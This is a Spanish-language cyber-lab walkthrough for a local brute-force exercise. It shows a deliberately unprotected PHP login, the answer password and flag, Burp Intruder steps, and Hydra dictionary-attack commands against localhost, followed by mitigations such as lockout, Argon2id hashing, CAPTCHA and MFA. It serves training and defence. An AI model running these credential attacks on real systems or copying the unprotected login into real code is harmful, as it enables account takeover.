---
title: "Lab 4: Brute Force"
description: Guía práctica del laboratorio de Brute Force en ULS CyberLab
sidebar:
  order: 24
---

# Lab 4: Brute Force

**Puntos totales:** 15 pts  
**Dificultad:** 🟢 Fácil  
**Módulo:** `http://localhost/mini-cyberlab/modules/bruteforce.php`

---

## Contexto

El brute force es uno de los ataques más simples: probar contraseñas sistemáticamente hasta encontrar la correcta. Es devastadoramente efectivo cuando:
1. No hay límite de intentos
2. Las contraseñas son comunes/débiles
3. Las herramientas automatizan el proceso

---

## Challenge: Dictionary Attack (15 puntos)

**Flag:** `FLAG{BRUT3_F0RC3_K1NG}`  
**Objetivo:** Encontrar la contraseña del usuario `ceo` usando un ataque de diccionario

### El Objetivo

Existe un usuario `ceo` con contraseña débil. El módulo muestra un formulario de login **sin ningún tipo de protección** contra múltiples intentos fallidos.

### Código Vulnerable

```php
// modules/bruteforce.php - Sin rate limiting
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Query con prepared statement (aquí el problema NO es SQLi)
    $stmt = $conn->prepare(
        "SELECT id, username, role FROM users WHERE username = ? AND password = ?"
    );
    $stmt->bind_param("ss", $username, $password);
    $stmt->execute();
    
    // ⚠️ No hay: sleep(), CAPTCHA, contador de intentos, bloqueo de IP
    if ($stmt->get_result()->num_rows > 0) {
        capture_flag('FLAG{BRUT3_F0RC3_K1NG}');
    }
}
```

### Método 1: Manual (con el formulario)

Prueba manualmente algunas contraseñas comunes:

```
usuario: ceo
contraseñas a probar:
  - 123456
  - password
  - admin
  - qwerty      ← ¡Esta es!
  - ceo123
  - letmein
```

Si tienes tiempo, esto funciona para el lab. Pero en la vida real, las contraseñas no son tan cortas y hay que automatizar.

### Método 2: Con Burp Suite Intruder (Recomendado para Windows)

#### Paso 1: Configurar el Proxy

1. Abre **Burp Suite Community**
2. Ve a **Proxy** → **Options** → Verifica que escucha en `127.0.0.1:8080`
3. En tu navegador, configura el proxy HTTP a `127.0.0.1:8080`
4. En Burp, activa **Intercept** → **Intercept is on**

#### Paso 2: Capturar la Petición

1. Navega a `http://localhost/mini-cyberlab/modules/bruteforce.php`
2. Ingresa `ceo` y cualquier contraseña
3. Haz clic en **Probar Credenciales**
4. Burp interceptará la petición

#### Paso 3: Enviar a Intruder

```
Click derecho en la petición → Send to Intruder
```

La petición POST se verá así:
```http
POST /mini-cyberlab/modules/bruteforce.php HTTP/1.1
Host: localhost
...

username=ceo&password=test123
```

#### Paso 4: Configurar el Ataque

En **Intruder → Positions**:
1. Haz clic en **Clear §**
2. Selecciona `test123` (el password)
3. Haz clic en **Add §**
4. Resultado: `username=ceo&password=§test123§`

En **Intruder → Payloads**:
1. Payload type: **Simple list**
2. Agrega manualmente:
   ```
   123456
   password
   admin
   qwerty
   ceo123
   letmein
   master
   dragon
   superman
   monkey
   ```
   O carga una wordlist desde archivo.

#### Paso 5: Iniciar el Ataque

1. Haz clic en **Start Attack**
2. Observa los resultados
3. La respuesta con **longitud diferente** o que **no contiene** "Credenciales incorrectas" es el éxito

### Método 3: Con Hydra (Kali Linux)

```bash
# Ataque básico
hydra -l ceo -P /usr/share/wordlists/rockyou.txt \
  -s 80 localhost \
  http-post-form \
  "/mini-cyberlab/modules/bruteforce.php:username=^USER^&password=^PASS^:Credenciales incorrectas" \
  -V -t 5

# Con wordlist pequeña (más rápido para el lab)
echo -e "123456\npassword\nadmin\nqwerty\nceo123" > mini_wordlist.txt

hydra -l ceo -P mini_wordlist.txt localhost \
  http-post-form \
  "/mini-cyberlab/modules/bruteforce.php:username=^USER^&password=^PASS^:Credenciales incorrectas" \
  -V

# Resultado esperado:
# [80][http-post-form] host: localhost   login: ceo   password: qwerty
```

### Resultado Esperado

Cuando encuentres la contraseña correcta (`qwerty`):

- ✅ El formulario muestra éxito
- ✅ Flag `FLAG{BRUT3_F0RC3_K1NG}` capturada (15 pts)
- ✅ El módulo muestra el contador de intentos realizados

---

## Lo que Muestra el Módulo

El módulo de brute force también muestra:
- **Contador de intentos** en los últimos 5 minutos (del log de BD)
- **Pistas** sobre herramientas (Hydra, Burp)
- **Mini diccionario** con las primeras contraseñas a probar
- **Hint sobre el usuario objetivo:** `ceo`

---

## Análisis de la Sesión en el Dashboard

Mientras haces brute force, ve al dashboard (en otra pestaña):
- Verás cómo se acumulan los logs de `WARNING` por los intentos fallidos
- Cuando encuentres la contraseña, aparece `OK` — Flag capturada

Esto simula cómo un analista SOC vería el ataque en tiempo real.

---

## Mitigación

### ✅ Rate Limiting con sesiones

```php
// Bloqueo temporal después de N intentos
session_start();
if (!isset($_SESSION['bf_attempts'])) {
    $_SESSION['bf_attempts'] = 0;
    $_SESSION['bf_lockout'] = 0;
}

if (time() < $_SESSION['bf_lockout']) {
    $remaining = ceil(($_SESSION['bf_lockout'] - time()) / 60);
    die(json_encode(['error' => "Bloqueado por $remaining minutos más."]));
}

$_SESSION['bf_attempts']++;

if ($_SESSION['bf_attempts'] >= 5) {
    $_SESSION['bf_lockout'] = time() + 900; // 15 minutos
    log_event('CRITICAL', 'bruteforce', "IP bloqueada: " . $_SERVER['REMOTE_ADDR']);
    die(json_encode(['error' => 'Demasiados intentos. Bloqueado 15 minutos.']));
}
```

### ✅ Contraseñas Seguras + Hashing

```php
// Almacenar con Argon2id (el más seguro actualmente)
$hash = password_hash($password, PASSWORD_ARGON2ID);

// Verificar
if (password_verify($input, $stored_hash)) {
    // Login exitoso
}
```

Con hashing fuerte, incluso si la BD es robada, las contraseñas no son directamente usables.

### ✅ CAPTCHA después de N intentos

```php
if ($_SESSION['bf_attempts'] >= 3) {
    // Requiere resolver CAPTCHA antes del próximo intento
    if (!verify_captcha($_POST['captcha_token'])) {
        die("Por favor completa el CAPTCHA");
    }
}
```

### ✅ MFA (Multi-Factor Authentication)

Incluso con la contraseña correcta, el atacante necesita el segundo factor.

---

## Recursos

- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Burp Suite Intruder Guide](https://portswigger.net/burp/documentation/desktop/tools/intruder)
- [SecLists Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
- [OWASP Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
